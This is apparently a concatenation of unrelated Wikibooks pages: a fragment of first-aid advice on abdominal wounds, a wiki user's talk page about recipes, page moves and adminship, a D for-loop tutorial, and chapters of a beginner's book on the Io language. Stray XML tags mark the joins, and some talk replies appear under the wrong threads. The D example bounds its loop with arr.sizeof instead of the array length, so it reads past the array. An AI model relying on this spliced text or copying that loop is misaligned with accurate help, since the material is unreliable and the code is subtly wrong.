Instead, have the person lie flat with their knees bent and cover the organs with a moist, sterile dressing composed of material that will not stick to the affected organs. Normally a special dressing, ABD Pad (Army Battle Dressing) or trauma dressing is used, though large Telfa dressing will work well. Gauze can stick if it is dry - be careful to keep normal gauze moist if you do use it. Paper products like paper towel or toilet paper must ''never'' be used, as they will turn to pulp, causing major complications. Do not allow the victim to eat or drink, though they may complain of extreme hunger or thirst. '''''Call an ambulance''''', treat for [[First Aid/Shock|shock]], and monitor ABCs until the emergency medical team arrives.

===Internal Bleeding===
&lt;!--this needs to be expanded: mention guarding etc--&gt;
If the abdominal injury does not cause an open wound, have the person lie flat with their knees bent and treat for shock until EMS arrives.

==Dear sir, please help a fool with titles==

Hello there! I figured I'd pester you since you seem to know what you're doing. How does one go about requesting a title be changed? [[Cookbook:Lime and Marscapone Cheesecake]] ought to be &quot;mascarpone.&quot; I've looked in the style guide, etc., but am missing it. Help? [[User:Jessicapierce|Jessicapierce]] 23:36, 2 May 2007 (UTC)
:To change the title of a page, you need to ''move'' it. Click the &quot;move&quot; link at the top of its page, and change the title as appropriate. You can also move recipes from the &quot;main&quot; namespace into the Cookbook namespace by doing the same thing. 
:NB: when you move a page, a redirect is created at the old page name so that any links to that page will still find the page at its new name. If there were already redirects to the old name, they ''won't'' be updated, and they won't work (because double redirects are not supported in the software.) You need to then update the sources to point at the new page - luckily the page move tool gives you a link to help you track them down.
:As for &quot;seem to know what you're doing&quot;, well, appearance is everything, isn't it? :-) [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 23:46, 2 May 2007 (UTC)

== Jet Database Wikibook ==

Thank you for your work in this regard. While I don't like having to deal with JetSQL, your reference is useful. If I have anything to contribute I will gladly do so.

Please check out my Open Source project [http://plane-disaster.sf.net/ PlaneDisaster.NET] for dealing with Microsoft Access databases. DO you think that this and other projects such as JetSQLConsole should be bentioned in the WikiBook?

--[[User:Zippy1981|Zippy1981]] 17:44, 20 May 2007 (UTC)

:G'day, and thanks! The book has stalled, but I'll get back to it soon - and I would certainly appreciate any help you can offer. I also don't like having to deal with JET SQL, which is why I want to have a decent reference to the bugger somewhere handy. The little bugger just won't die!
:As for PlaneDisaster.NET and JetSQLConsole, yes, by all means. Perhaps we could have a page dedicated to tools useful for manipulating JET. I've currently spec'd a page for &quot;Integration and migration&quot;, but there's really more to it than that - the two tools you've mentioned, and others of a similar nature, should have a &quot;Utilities&quot; page or something, and there should also be a page on working with design tools like Visio and MySQL Workbench (just from the JET perspective).

:No problem, and thanks for the great recipe! I really love kibbe, and look forward to trying to make it. Somehow, I'll have to try to make a gluten-free one though - maybe with brown rice, or buckwheat?

== Potential cookbook page? ==

Hey webaware, I was messing with random books and stumbled across [[Wine and Cheese Party|this]] module, I'm not sure if this fits in any of the current modules but do you think it'd be interesting to put stuff like that in there, or is it better just to leave the organization as it is? Regards, [[User:Mattb112885|Mattb112885]] &lt;small&gt; ([[User talk:Mattb112885|talk]]) &lt;/small&gt; 15:36, 24 May 2007 (UTC)

:G'day, looks more like a How-To than a Cookbook recipe or technique, and not really Bar Tending either. I'd leave it where it is - although, I did stumble across a food-related category the other day, so perhaps it ought to be listed in that too. If I remember where I saw it, I'll add it to that cat. [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 15:42, 24 May 2007 (UTC)

:: Sounds good, BTW you guys are doing great, googling cookbook [http://www.google.com/search?q=cookbook&amp;ie=utf-8&amp;oe=utf-8&amp;aq=t&amp;rls=org.mozilla:en-US:official&amp;client=firefox-a here] brings up the wikibooks cookbook as the second choice (even above the wikipedia entry for &quot;cookbook&quot;!), keep up the good work!

could you help me out fixing up the latest recpie I translate? [[Cookbook:Roasted eggplant]]. thanks in advance. --[[User:Barak4wiki|Barak4wiki]] 22:13, 30 May 2007 (UTC)

:G'day Barak, I had a crack at it - see if it still matches what you intended. I wasn't sure what you meant by &quot;chopper&quot; - a chopping board, or a chopping knife (like a cleaver, perhaps?)

== Images ==

Hi, I am pretty sure the images in question were from the source given on [[Cell Biology]]. Unfortunately, the pages do not seem to be accessible anymore, so I cannot prove this. The Wayback Machine apparently has no copy of these pages either. I am trying to find Mark Dalton, who apparently put that page up in the first place. I'll keep you informed. --[[User:Magnus Manske|Magnus Manske]] 18:09, 18 June 2007 (UTC)
:Good news : I found Mark, and he mailed me permission to &quot;une them under any license I like&quot;. So, I'll put them under GFDL and CC-BY-SA. I know there's a mail-permission-to system somewhere, but where? --[[User:Magnus Manske|Magnus Manske]] 19:53, 18 June 2007 (UTC)

::G'day Magnus, that's good news. Just post a copy of that email as a sub-page to your user page (e.g. [[User:Magnus Manske/Mark Dalton images]]) and link to it from those image pages. cheers, [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 00:56, 19 June 2007 (UTC)

== Thanks ==

Hey Webaware. Thanks for being my guardian angel with these recipes I put up. Still havent learned really where to put them and how, and so am grateful someone does it for me. Its such fun putting them up ! I'm under no illusion that anyone actually tries them, but you never know. Are you a good cook ? What are your favourite recipes ? Peter

:G'day Peter, always happy to help. To start a new recipe page, just type the name into the search box (on the left) but prefix it with &quot;Cookbook:&quot;, e.g. &quot;Cookbook:My New Recipe&quot;. If you miss, I'll watch out for them anyway and move them to the right place :-)
:Does anyone actually try your recipes? Or mine? Who knows! But they're up there in case someone wants to. I see a lot of comments left on recipe talk pages, as well as minor corrections / additions left by anonymous users as they try a recipe out and just ''have'' to add their little tweaks, so yes, I'd say that someone is sure to try your recipes!
:Am I a good cook? Observational bias suggests that I am, but also that I'm an above-average driver just like the other 70% of drivers who think they are! I'm good at throwing together a meal out of what's in the fridge and cupboards, and making it taste good. It's often not &quot;authentic&quot;, and I often take shortcuts that would have restaurant chefs shaking their heads, but I'm cooking for me and mine, so it doesn't matter. I have the added challenge of making it taste good and keeping it safe for my wife, who has food intolerances and is ''very'' [https://shop.therainforestsite.com/store/item.do?itemId=28528&amp;siteId=221&amp;sourceId=332&amp;sourceClass=Category&amp;index=35 demanding]. We have a wide range of spices and herbs to suit a wide variety of cooking styles, as a substitute for the frequent restaurant visits we had been used to before her diagnosis.
:Favourite recipe? Hard to pick. I very much like [[Cookbook:Mapo Doufu|mapo doufu]], either with tofu or black-eyed peas; [[Cookbook:Cholley|chole]] is a regular favourite; we usually fit our own slap-dash version of [[Cookbook:Paella|paella]] into a fortnight somewhere (although our style might be closer to a chicken/seafood [[Cookbook:Risotto|risotto]]); roast whatever is going with lots of roots and tubers, which inevitably leads to a hearty soup made from the leftover roast veges, perhaps a bone broth from the bone pressure-cooked with some beans; [[Cookbook:Stir-Frying|stir-fry]] whatever, especially chicken, tofu, or [[Cookbook:Tempeh|tempeh]]; [[Cookbook:Ratatouille|ratatouille]], very nice with lamb chops and mashed spud; oh, I could go on and on, but I won't. I must rush off now to make some [[Cookbook:Dosa|dosa]] to go with [[Cookbook:Soft Boiled Eggs|boiled eggs]] for what is now a very late breakfast (late night last night!) 
:What are your favourites? [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 01:34, 19 June 2007 (UTC)

== Hi There ==
I will be reading the wikibooks guidelines in scrutiny, especially for ''POV'' and
''original research''.
I will be re-editing the rough drafts I am currently placing as time goes bye.
If there is any violation that requires my immediate attention,
please let me know.
thanks.

Realise that listing your books for a vote for deletion doesn't mean that they will be deleted, just that I think they may need to be reviewed for such. cheers, [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 03:56, 19 June 2007 (UTC)
==== Reggy ====

Thanks. I have many questions with no definite answers you can probably give me, so I cluttered [[User_talk:Ohadaloni|my own talk page]] with these thoughts.
Please respond to anything you believe you can help me with.
If it seems I am in some material breach of some guidlines,
I prefer saving much effort by taking a break and re-visiting
and re-organizing my wikibooks goals.

== Category:License tags ==

Webaware, I know I originally created [[:Category:License tags]] and then we both proceeded to migrate copyright tags into that category.  In retrospect, I think that [[:Category:Image copyright tags]] would be more appropriate (I know the latter category was used prior to the former category)); some of the templates in there (in particular, the non-free ones) do not denote that the image is used under a ''license'', which the current category name implies.  This is merely a difference of semantics, but I would like to change the categories (which I could do with a semi-automatic installation of AutoWikiBrowser).  Do you have comments?  Cheers, [[User talk:Iamunknown|Iamunknown]] 19:47, 20 June 2007 (UTC)  ''Oh, and thanks for doing all those GFDL-presumed tags!  :)''

:Sounds reasonable. But should it be &quot;Media copyright tags&quot;, or even just &quot;Copyright tags&quot;? We use them on sound bites, PDFs and various other media too, right? Then again, Commons just has &quot;License tags&quot;, why should we be any different? [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 00:26, 21 June 2007 (UTC)

:: Hmm, more semantics.  ;)  Well, the namespace where all media are stored is called the &quot;image&quot; namespace, Wikipedia uses &quot;Image copyright tags&quot; (as opposed to &quot;License tags&quot;), so who knows...  I'd be comfortable with &quot;Image copyright tags&quot;.  --[[User talk:Iamunknown|Iamunknown]] 23:33, 21 June 2007 (UTC)

:::I don't really see the need for the change, given that we currently shadow Commons (which I respect more than WP on these matters). If we do change, I'd prefer we went to &quot;Copyright tags&quot; so that someone with a PDF doesn't think they're looking in the wrong category. [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 23:53, 21 June 2007 (UTC)

== Kudos to you ==

I just wanted to say that i've seen alot of your edits recently on the RC feed: welcoming new users, tagging unlicensed images, etc. I just wanted to let you know that I think you are doing an awesome job. Keep up the good work. --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 03:14, 22 June 2007 (UTC)

== Images ==

Webaware, make sure you put in the right image copyright tag; [[:Image:UzbekPlov.jpg]] isn't CC-BY-SA-2.0, it is CC-BY-NC-SA-2.0 which is not free.  Same with [[:Image:Uzbekistan Architecture.jpg]].  --[[User talk:Iamunknown|Iamunknown]] 23:26, 22 June 2007 (UTC)

That said, thanks for all the cleanup.  :)  --[[User talk:Iamunknown|Iamunknown]] 23:33, 22 June 2007 (UTC)

:Ack! Thanks for the catch, I honestly didn't notice. Must stop trying to do stuff like that after 1am! cheers, [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 01:48, 23 June 2007 (UTC)

== Adminship ==

I've been lead to believe by an anonymous source that If you were nominated for adminship again, that you would accept the nomination? I sincerely hope this is so,  I've been watching the RC feed the last few days and i see that you've done alot of  good work around here. On top of that, the work you have been doing, such as finding and marking spam, reverting vandalism, etc, is the kind of work that can really benefit from having the extra buttons. 

Anyway, I want to nominate you because I really believe you are the most deserving non-admin right now, and because I think you are an asset to this project. What do you say? --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 01:26, 28 June 2007 (UTC)

:G'day Whiteknight, yeah, I would accept if nominated again. I can see a use for those extra buttons now - if only to reduce the work for others cleaning up after my speedy delete tagging. I'm not sure about blocking, but I guess I'd pick it up as I went along. I declined last time because I didn't want to expend time learning new &quot;sysop&quot; stuff, but that isn't so much of an issue this time. Besides, my actual contributions are lagging regardless... [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 01:53, 28 June 2007 (UTC)

      <text xml:space="preserve">{{A Beginner's Guide to D}}

The most complicated loop statement that D provides is the ''for'' loop. The ''for'' loop is borrowed directly from C, and shares its syntax. It has the following form:

 for(statements; conditional; statements) { body }

The first set of ''statements'' are separated by commas, and are executed before the loop begins. Variables can be declared in these statements. This is usually used to initialize an index variable. The ''conditional'' is a Boolean value, and is executed before each iteration of the loop. The body is only executed as long as the ''conditional'' remains ''true''. The last set of ''statements'' are executed after the ''body'', and usually increments an index variable.

The following is the typical use of the ''for'' loop:

&lt;source lang=&quot;D&quot;&gt;
import std.stdio;

void main()
{
   int arr[] = [1, 2, 3, 4, 5];
 
   for(size_t x=0; x&lt;arr.sizeof; x++) {
      writefln(&quot;%d&quot;, arr[x]);
   }
}
&lt;/source&gt;

However, more complicated ''for'' loops are possible. For example, a ''for'' loop can iterate over two arrays, in opposite directions, at the same time:

&lt;source lang=&quot;D&quot;&gt;
void reverse_array(out int[] dest, int[] src) {
    dest.length = src.length;

    for(size_t dx=0, sx=src.length-1; dx &lt; dest.length; dx++, sx--) {
        dest[dx] = src[sx];
    }
}
&lt;/source&gt;</text>

      <text xml:space="preserve">== About Io ==

I cannot give a significantly better executive summary of what Io is than what's already on the Io language website&lt;ref&gt;http://www.iolanguage.com&lt;/ref&gt;:

:Io is a small, prototype-based programming language. The ideas in Io are mostly inspired by Smalltalk (all values are objects), Self (prototype-based), NewtonScript (differential inheritance), Act1 (actors and futures for concurrency), LISP (code is a runtime inspectable/modifiable tree) and Lua (small, embeddable).

Still, it hardly does much to capture the essence of what Io actually is, how to use it to solve problems, or to extend its functionality with new features.  This wikibook aims to cover all of these aspects, in varying degrees of detail.  We start with the basics, of course; we assume that you, the reader, have had relatively little programming experience in the past.

One thing you ''should'' know is that Io has not yet received its '''1.0''' badge of honor.  The language and its libraries are, while becoming more and more stable every day, still maturing.  This wikibook was written with Io 20070410.  This means that I used a version of Io that was &quot;released&quot; on 2007 April 10.  While it doesn't mean that the entirety of the book will be invalid in the next release, please be aware that Io is an extremely ''fluid'' language (and is so by design!), and is prone to change over time as developers and users require.

      <text xml:space="preserve">== Getting Started ==

=== Posix Systems ===

Io is primarily developed on Unix-based systems, most notably MacOS X.  As such it is easiest to build and use Io on these systems.  Io has been successfully compiled on MacOS X, Linux, and various BSDs and should have no problem compiling on any system that complies to the Posix standard and has a C99 compliant compiler.

==== Download the source ====

First you need to download the source.  It is recommended to get the code from the git repository:

 $ git clone https://github.com/stevedekorte/io.git

Or, you can find the downloads at the following website: http://iolanguage.com/downloads/

==== Compile ====

Now that you have Io downloaded, let's build it! To do that, change to the newly created directory and create a directory to perform the building in:

You will need [http://www.cmake.org/ cmake]

 $ cd io
 $ mkdir build &amp;&amp; cd build

From this directory we want to run CMake which will feel out the environment the same way autotools does for other projects and generate the makefiles:

 $ cmake ..

This will check which libraries you do and don't have and determines which addons can be built based on what dependencies you do have.  If you have libraries installed in non-standard places (such as zlib in /opt/zlib or ~/zlib/) then you will need to run one of CMake's graphical configuration tools and tell it where those are, then configure it again.  &lt;code&gt;ccmake&lt;/code&gt; is almost always available, &lt;code&gt;cmake-gui&lt;/code&gt; is available for major platforms like OS X, Windows and some Linux distributions:

 $ cmake-gui ..

To build the IoVM and any addons that can be built from the source and library files that you have on your computer, just run &lt;code&gt;make&lt;/code&gt;!

 $ make

If you have problems with compilation you may not have all the dependencies you need.  Ensure you have your operating system's compiler tools (this is often GCC) are installed, as some versions of Linux do not come this way unless you explicitly tell them to when you are setting up the system.

==== Install ====

Wait a while (on a MacBook it takes about one minute) and it should compile everything successfully; you may then install it to your system like so:

 $ make install

or 

 $ sudo make install

And this will put the binaries &lt;code&gt;io&lt;/code&gt; and &lt;code&gt;io_static&lt;/code&gt; in to the install path (&lt;code&gt;/usr/local/bin&lt;/code&gt; for binaries usually, &lt;code&gt;/usr/local/lib&lt;/code&gt; for libraries; both may be changed with the CMake configuration tool by changing the install path) as well as &lt;code&gt;libbaselib.dylib&lt;/code&gt;, &lt;code&gt;libgarbagecollector.dylib&lt;/code&gt;, &lt;code&gt;libcoroutine.dylib&lt;/code&gt; and &lt;code&gt;libiovmall.dylib&lt;/code&gt;.

NOTE: The CMake scripts Io uses do not currently install the header files for use with embedding, that has to be done manually.

===== Linux =====
After installing you may need to configure ld on Linux.  Add this line to /etc/ld.so.conf
 include /usr/local/lib

Then reconfigure ld(, or add current directory with the newly built Io environment to path):
 sudo ldconfig

Confirmed to have worked with Ubuntu 10.10. Please note that your user might not have rights to edit /etc/ld.so.conf - in that case sudo gedit /etc/ld.so.conf might work. More alternatives and discussion [http://forums.pragprog.com/forums/147/topics/4647 here].

===== Debian, non-default install directories, missing cmake =====
This recipe (written 20101018) covers installation on Debian 5.0.6, and guidelines
for dealing with non-default install directories and what to do if your OS doesn't
have an up-to-date version of cmake.  &lt;code&gt;$MYIROOT&lt;/code&gt; is assumed to be the
root of the install tree (for example, in your home directory &amp;mdash; but with
addition of appropriate &lt;code&gt;su(do)&lt;/code&gt; commands this will work for
&lt;code&gt;/usr/local&lt;/code&gt; and similar non-default system-wide install trees).

Debian 5.0.6 doesn't have a sufficiently recent version of cmake for the current
version of Io (wants 2.8, Debian has 2.6).  The following commands retrieve and
install cmake-2.8.2 (the apt-get commands make sure that any build prerequisites are
installed):

&lt;code&gt;
  $ sudo apt-get build-dep cmake
  $ sudo apt-get install libssl-dev
  $ cd /tmp
  $ wget http://www.cmake.org/files/v2.8/cmake-2.8.2.tar.gz
  $ tar xzf cmake-2.8.2.tar.gz
  $ cd cmake-2.8.2
  $ ./configure --prefix=$MYIROOT
  $ make
  $ make install&lt;/code&gt;

Tidy up:

&lt;code&gt;
  $ cd /tmp
  $ rm -fr cmake-*&lt;/code&gt;

Next, for Io you can more-or-less iterate through the generic Linux instructions:

&lt;code&gt;
  $ git clone git://github.com/stevedekorte/io.git
  $ cd io/build
  $ ccmake ..
  [hit 'c' to configure, change CMAKE_INSTALL_PREFIX to
   the value of $MYIROOT, then hit 'g' to generate and quit]
  $ make
  $ make install&lt;/code&gt;

Tidy up:

&lt;code&gt;
  $ cd /tmp
  $ rm -fr io&lt;/code&gt;

If you can't engage with the ldconfig incantations described above, non-standard install locations will need LD_LIBRARY_PATH to include the lib directory in which Io's libbasekit.so etc. are installed.

==== Start Up! ====

Io will now be installed and can be started using the command: 
 io

If you type just &lt;code&gt;io&lt;/code&gt;, you will enter the interactive interpreter.  To quit the interactive interpreter, press Ctrl-D or type '''exit'''.·

:'''NOTE'''
If you type something after &lt;code&gt;io&lt;/code&gt;, it will be interpreted as a filename, even if it is something like &lt;code&gt;--help&lt;/code&gt; or &lt;code&gt;--version&lt;/code&gt; that should be interpreted as an option.

==== Finishing Touches ====

Now we can test the installation to see if everything works as expected.

 $ make test

Optionally, you're free to clean up the build directory as well:

 $ make clean

=== Windows Systems ===

Pre-compiled binaries for Io exist at [http://www.iolanguage.com/downloads/ the Io downloads page], and are presently the recommended way of using Io on this platform.  Compiling it yourself is not particularly trivial at the time of writing and requires the use of unix emulation tools such as MSYS or Cygwin.

      <text xml:space="preserve">== Your First Program ==

When learning to program, the first thing usually learned is how to write a program that prints &quot;Hello, world!&quot; to the console.  It gives new programmers a feel of how simple programs are structured.  Io has many ways to write programs which do basically the same thing, so at times it can be confusing about which one to use.  Writing to the screen is no exception!

Enter the Io's interactive interpreter (by typing &lt;code&gt;io&lt;/code&gt; at the console) and type the following:

 writeln(&quot;Hello, world!\n&quot;)

With the interactive interpreter, this should look like:

 $ io
 Io&amp;gt; writeln(&quot;Hello, world!\n&quot;)
 Hello, world!
 ==&amp;gt; nil

It looks like '''writeln''' is telling Io to write something to the console, specifically the stuff inside the parentheses.  But, why parentheses?  Nothing else is on the line, so it should be able to figure out what you mean by just printing the rest of the line, right?

Although they are convenient to use for inserting comments into prose, they're also convenient to use to ''group together'' all sorts of stuff (like grocery lists, things to do, algebraic expressions, and as this parenthetical expression clearly shows, lists of examples of parenthetical examples!).  It is in this second common use that Io uses parentheses: in this case, to group together the stuff you want '''writeln''' to deal with.  Each item you want to have '''writeln''' work with is separated by a comma, like so:

 Io&gt; writeln(&quot;Hello&quot; , &quot; there!&quot;)
 Hello there!
 ==&gt; nil

Notice that, in this case, we gave '''writeln''' two things to work with, separated by a comma.  If we wanted to, we could have given '''writeln''' 50 things to write out, each separated by a comma.

So far, though, we haven't quite answered the question.  Let's try a slightly different program, which should help illustrate the point.  Just type the following in:

 Io&gt; greet := method(
 )-&gt; writeln(&quot;What is your name?&quot;); you := File standardInput readLine;
 )-&gt; writeln(&quot;Hello &quot;, you)
 )-&gt; )

Io will respond with:

 ==&gt; method(
     writeln(&quot;What is your name?&quot;); you := File standardInput readLine
     writeln(&quot;Hello &quot;, you)
 )

Don't worry about what all that gobbledyguk means.  What we basically did was write a very simple Io program -- indeed it's your very first!  Let's run it:

 greet

It'll respond by asking you for your name.  Go ahead and type it in:

 What is your name?
 Sam
 Hello Sam
 ==&gt; nil

The answer to the question of why write needs those parentheses is right there in the above program.  If '''writeln''' just consumed the remainder of the line, then it would not be possible to string together multiple things for the computer to do.  It ''probably'' would have printed out something like this instead:

 Io&gt; greet
 What is your name?
 you := File standardInput readLine
 Hello·
  Exception: Object does not respond to 'you'
  ---------
  Object you                           greet Line 3

Whoa!  What is all this mess?  We'll see what these things are later in this book.  Fortunately, we have those parentheses to keep us on the right path.

Now, all this time I've been calling everything inside those parentheses ''things.''  Well, they are, but they have a more correct name for them.  Instead of constantly calling these things ''things,'' we choose to call them ''arguments'' instead.

With all these parentheses and arguments flying around, this might start to sound like what you learned way back in Algebra class at Paleozoic High.  You're right -- this notation comes from the concept of ''algebraic functions.''  '''writeln''' is said to be the function name, and both &lt;code&gt;&quot;Hello &quot;&lt;/code&gt; and &lt;code&gt;you&lt;/code&gt; are its arguments.··

:'''NOTE'''
'''writeln''' is ''not'' a true function in the algebraic sense.  It is more correctly described as a ''procedure'', and you might hear this term used now and again.  But, there is still a ''third'' term for it, called a '''method''', for reasons that will be made clear later in this book.  For now, we can ignore these differences.

      <text xml:space="preserve">== Basic Components of Io Programs ==

There are a number of basic components you need to be familiar with to make effective Io programs.

=== Keywords ===

Strictly speaking, Io has no keywords.  However, it does have a syntactic sugar layer that, for all intents and purposes, gives it a few keywords.  There are only three of these keywords-that-aren't-really-keywords in the whole language.  We've seen one already.

; &lt;code&gt;;&lt;/code&gt; : The semicolon is used to separate different things the computer should do.  You won't be using this often, but it sometimes can come in quite handy.
; &lt;code&gt;=&lt;/code&gt; : The equals is used to ''update an already existing'' variable.  But, what if we don't already have a variable declared?  Enter . . .
; &lt;code&gt;:=&lt;/code&gt; : This assignment operator (read, &quot;becomes&quot;) is used to ''create a new'' variable (it also updates it if it happens to already exist).·

We won't get into how these not-exactly-keywords affect Io just yet.  For now, let's just pretend that they're real keywords.

=== Strings ===

Strings are ''strings of characters,'' really.  Those are chunks of text wrapped inside quotation marks, like this:

 Io&gt; &quot;Hello world!&quot;
 ==&gt; &quot;Hello world!&quot;

Sometimes, it is awfully convenient to put line breaks, tabs, or even bells (but not whistles) into text too.  We do this with ''escape sequences.''  Far and above, the #1 escape sequence you'll use the most is &lt;code&gt;\n&lt;/code&gt;.  This particular escape sequence signals a newline, the equivalent of pressing enter.  If you just pressed enter in the middle of this kind of string, it would confuse Io.

I mentioned &quot;this kind&quot; of string, because this ended up being a big enough problem that a new kind (borrowed from Python) was eventually implemented.  This is the now famous ''triple-quoted'' string.  They look like this:

 Io&gt; &quot;&quot;&quot;Hello world!&quot;&quot;&quot;
 ==&gt; &quot;Hello world!&quot;

What's the difference?  The triple-quoted string ''does'' allow you to type the ENTER key right in the middle:

 Io&gt; &quot;&quot;&quot;Dear sir,
 &quot;-&gt;
 &quot;-&gt; I must admit, I really like your suggestion
 &quot;-&gt; to learn Io.  Thank you for the kind words.
 &quot;-&gt;
 &quot;-&gt; Sincerely,
 &quot;-&gt;
 &quot;-&gt;
 &quot;-&gt; Robert.
 &quot;-&gt; &quot;&quot;&quot;
 ==&gt; Dear sir,
 
 I must admit, I really like your suggestion
 to learn Io.  Thank you for the kind words.
 
 Sincerely,
 
 
 Robert.

=== Return Values ===

You wouldn't normally see the results that functions and procedures produce listed as a language element in most books.  But, Io is different -- it is a ''very'' real language element that you ''must'' deal with.  This is pretty ominous, isn't it?

In Io, as with a lot of functional programming languages, ''everything you say or do in Io is an expression.''  This is &quot;fancy computer science talk&quot; for, ''everything you say or do produces some kind of result which can be used by some subsequent part of a program.''  Now you know why we prefer the computer science way over the plain-English way of saying it!

Let's break this down a bit further.  An ''expression'' is anything that produces a ''value'' of some kind.  A value can be a string, a number, a boolean (true/false) thingy, whatever.  Examples:

 Io&gt; 4+4
 ==&gt; 8
 Io&gt; 15 - 150
 ==&gt; -135
 Io&gt; &quot;Hi!&quot;
 ==&gt; Hi!

OK, so we just demonstrated that Io is a glorified calculator.  In and of itself, this is entirely  uninteresting.  But, what makes an expression useful is the fact that we can ''do stuff'' with the results before actually giving the final result.

 Io&gt; &quot;There are &quot; .. (8*10)+19 .. &quot; bottles of beer on that very wall, over there.&quot;
 ==&gt; There are 99 bottles of beer on that very wall, over there.

Here, we use the '''..''' operator to ''concatenate'' things together into a single value.  In this case, we're tacking ''the result'' of (8*10)+19 onto the string &quot;There are &quot;, giving us &quot;There are 99&quot;.  Then, &quot; bottles of beer....&quot; is appended onto that, giving us the result we see above.

If Io has nothing else to do with the result of an expression, it prints the &lt;code&gt;==&gt;&lt;/code&gt; arrow, and the result, with the assumption that you care about it.  Usually, of course, you do, otherwise, you wouldn't have let the result go without further processing to begin with!

=== nil ===

In the event that nothing useful is able to be returned from some computation or action, then '''nil''' is returned.  As we saw earlier when playing around with '''writeln''', we noticed that it ''returned'' the '''nil''' value.  That's because it doesn't actually compute anything for us; it's a pure action.

=== Numbers ===

Numbers are, pretty much, as you expect them to be.  Integers and real numbers are both treated equally (in fact, currently, they're always converted into double-precision floating point notation for uniformity).  Here are a few examples of numbers:

 Io&gt; 45
 ==&gt; 45
 Io&gt; 4.5e+2
 ==&gt; 450
 Io&gt; 4.5e+38
 ==&gt; 4.500000e+38
 Io&gt; -15360.263823
 ==&gt; -15360.263823

Hexadecimal values are also permitted using the C-inspired syntax '''0x''' and the hex digits:

 Io&gt; 0xDEAD
 ==&gt; 57005
 Io&gt; 0xBEEF
 ==&gt; 48879
 Io&gt; 0xDEADBEEF
 ==&gt; 3.735929e+09
 Io&gt; 0xDEADBEEFFEEDFACE
 ==&gt; 4.294967e+09

That last number shows us something interesting -- it's clearly too small a result for a hexadecimal number so big!  It turns out that, when converting hexadecimal numbers into its internal representation, only 32-bits worth of precision is maintained.  If a hexadecimal number is larger than this, then the largest 32-bit integer is used instead.

Some might say this is a bug in Io.  Perhaps; but it is not for this book to judge.  However, if you intend on manipulating hexadecimal values with greater than 32-bits of precision, you'll need to convert them manually into decimal notation first.

Some other languages support concepts like complex numbers, infinite precision numbers, etc.  Io doesn't support these with the basic set of primitives provided by the language's interpreter.  However, these can be added either by external add-ons, or through Io itself.

=== Objects ===

Surprise -- Io is an object oriented language, even though we never introduced them up until now.

      <text xml:space="preserve">== Objects ==

Io is a dynamically-typed, dynamically-dispatched, object-oriented programming language, very much like Self and Smalltalk.  Up until this point, we have only been dealing largely with the most primitive things in the language.

The time has come, however, for the reader to learn about objects and how they are used within the Io environment.

=== What are Objects? ===

An object, used in the context of computer programming, is an abstraction of a concept or tangible thing which, anthropomorphically, you can tell what to do.  For example, this statement:

 Io&gt; writeln(&quot;Hello world!&quot;)

can be seen as telling the computer to write a line to the screen.  An object oriented language allows us to embrace this concept and take it to a level where it is a bit more useful for our needs.  If you refer back to your first Io program, there was one line in it which read this:

 you := File standardInput readLine

The expression is evaluated in the following order:
* First, '''File''' is evaluated.  We're telling the computer to get us a File, whatever that is (we needn't be concerned with this just yet).
* Next, we ''tell the '''File''''' to give us the standard input.
* Next, we ''tell that thing'' to read a line of text.
* Finally, we assign that to '''you'''.

What happens if we ask the computer itself to give us a standard input object?

 Io&gt; standardInput
·
   Exception: Object does not respond to 'standardInput'
   ---------
   Object standardInput                 Command Line 1

What we're seeing is an ''error message''.  It's composed of several components, which you should familiarize yourself with.  You'll be seeing a ton of these things as you start out.
* The top line (Exception: Object does not...) is telling us that '''Object''' doesn't respond to the standardInput message.
* The bottom part is a ''traceback,'' which tells us where the error occurred.  This is invaluable when trying to figure out where something has gone wrong.

So far, we have seen how objects are used to partition some namespace into useful libraries.  But, we really haven't seen anything yet; objects are substantially more than just a fancy name for libraries.

=== How do Objects Work? ===

In order to see how to employ objects to make our programs more modular, it is useful to know &quot;how they work,&quot; so to speak.

It's useful to think of an object as this ''thing'' that can follow orders.  What orders it can follow are determined by what appears in its ''slots.''

For example, let's make a little object of our own.  The object-oriented equivalent to the infamous ''hello world'' program is none other than:

 Io&gt; Account := Object clone
 Io&gt; Account balance := 0
 Io&gt; Account withdraw := method(amount, self balance = self balance - amount)
 Io&gt; Account deposit := method(amount, self balance = self balance + amount)

I've elided the outputs from the Io interpreter here for brevity.  But what we've just done is:

# created an '''Account''' object.
# configured the object to have a balance of zero.
# taught the Account object how to withdraw something (presumably cash)
# taught the Account object how to deposit something

We can query this object for the current account balance easily enough:

 Io&gt; Account balance
 ==&gt; 0

This works because executing '''Account''' is enough to tell the interpreter, &quot;OK, I'm now running in the context of this '''Account''' thing.&quot;  The next instruction is '''balance'''.  The interpreter sees that '''Account''' clearly implements a '''balance''', and so executes it.  In this case, its value is zero.  Hence, the &lt;code&gt;==&gt; 0&lt;/code&gt; report.

Another way of looking at it, and indeed, the ''preferred'' way, is to think, &quot;Hey!  '''Account!''' You there!  Balance, ''now!''&quot;.  In other words, we're ''telling the '''Account''' object'' to give us the balance.  As you can see, this is not really a whole lot different from '''File standardInput readLine''' -- the latter simply has more commands, but the mechanics is exactly the same.

Next, let's deposit some cash in our account.

 Io&gt; Account deposit(100)
 ==&gt; 100

This produces an unexpected result -- why did it return 100, and not ''nil''?  It's because the last thing it computed was '''self balance + amount''', which evaluates to 0+100 when you think about it.

